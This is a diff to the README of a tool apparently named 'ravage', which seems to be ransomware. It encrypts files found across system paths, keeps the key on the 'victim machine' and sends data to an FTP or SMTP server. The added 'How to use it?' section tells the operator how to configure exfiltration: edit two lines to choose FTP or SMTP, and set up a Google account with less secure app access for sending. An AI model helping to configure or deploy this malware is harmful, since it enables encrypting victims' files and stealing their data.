@@ -10,6 +10,9 @@ Once run from the console, ravage checks all the system paths with a valid exten
 Finally the data is sent to an FTP or SMTP server.
 For security reasons, the key is stored on the victim machine.
 
+## How to use it?
+Edit the lines 87 and 88, change the boolean values to select the way in which the data will be sent. In the case of using SMTP, create a Google account and in settings enable "Access to less secure applications". Then insert the data of the configuration you want to use.
+
 ## In Development
 * Multithreading for fast encryption
 * Support for Windows systems
